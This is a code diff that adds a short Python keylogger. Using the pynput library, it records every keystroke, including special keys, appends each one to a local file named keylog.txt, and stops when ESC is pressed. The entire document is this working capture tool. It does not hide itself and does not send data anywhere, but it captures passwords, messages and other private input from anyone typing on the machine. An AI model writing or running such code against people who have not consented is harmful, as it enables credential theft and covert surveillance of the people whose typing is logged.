@@ -1,0 +1,27 @@
+#install pynput before applying the code
+
+from pynput import keyboard
+from datetime import datetime
+
+log_file = "keylog.txt"
+
+def write_to_file(key):
+    with open(log_file, "a") as f:
+        f.write(f"{key}\n")
+
+def on_press(key):
+    try:
+        write_to_file(key.char)
+    except AttributeError:
+        write_to_file(str(key))
+
+def on_release(key):
+    # Stop listener when ESC is pressed
+    if key == keyboard.Key.esc:
+        print("Logging stopped.")
+        return False
+
+print("Key logger started (press ESC to stop)...")
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
